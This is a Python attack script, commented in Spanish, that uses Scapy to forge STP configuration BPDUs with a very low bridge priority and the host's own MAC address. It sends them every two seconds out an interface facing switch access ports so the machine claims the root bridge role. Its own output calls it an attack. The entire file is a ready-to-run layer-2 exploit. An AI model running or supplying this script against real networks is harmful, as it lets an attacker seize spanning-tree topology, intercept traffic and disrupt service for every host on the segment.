#!/usr/bin/env python3
"""
=============================================================
  STP ROOT CLAIM — MODO ACCESO PURO (IEEE 802.1D)
  Diseñado para puertos en 'switchport mode access'
=============================================================
"""
import struct
import time
import sys
import signal
from scapy.all import Ether, LLC, Raw, sendp, get_if_hwaddr

INTERFACE = "ens4"
VLAN_ID   = 10   # Mantenemos el ID para calcular la prioridad (0 + 10 = 10)

def obtener_mac():
    mac_str = get_if_hwaddr(INTERFACE)
    return bytes(int(x, 16) for x in mac_str.split(":"))

def main():
    mac_bytes = obtener_mac()
    mac_str = ":".join(f"{b:02x}" for b in mac_bytes)

    # 1. Dirección MAC destino estándar global de STP (IEEE)
    MAC_DESTINO_STP = "01:80:c2:00:00:00"

    # 2. Construcción de los datos de la BPDU (35 bytes esenciales)
    bpdu = struct.pack("!HBB", 0x0000, 0x00, 0x00) # Protocol STP, Version 0, Type Config
    bpdu += struct.pack("!B", 0x01)                # Flags: Topology Change
    bpdu += struct.pack("!H", 0 + VLAN_ID)         # Prioridad Root efectiva (10)
    bpdu += mac_bytes                              # Root MAC (Nosotros)
    bpdu += struct.pack("!I", 0)                   # Costo de camino (0)
    bpdu += struct.pack("!H", 0 + VLAN_ID)         # Prioridad Bridge (10)
    bpdu += mac_bytes                              # Bridge MAC
    bpdu += struct.pack("!HHHHH", 0x8001, 0, 20 << 8, 2 << 8, 15 << 8) # PortID y Timers

    # 3. Ensamblado plano SIN capa Dot1Q intermedia
    trama_plana = (
        Ether(src=mac_str, dst=MAC_DESTINO_STP) /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        Raw(load=bpdu)
    )

    print(f" [+] Inyectando BPDUs planas en {INTERFACE} hacia puerto de acceso...")

    def salir(sig, frm):
        print("\n [+] Ataque detenido.")
        sys.exit(0)

    signal.signal(signal.SIGINT, salir)

    while True:
        sendp(trama_plana, iface=INTERFACE, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    main()
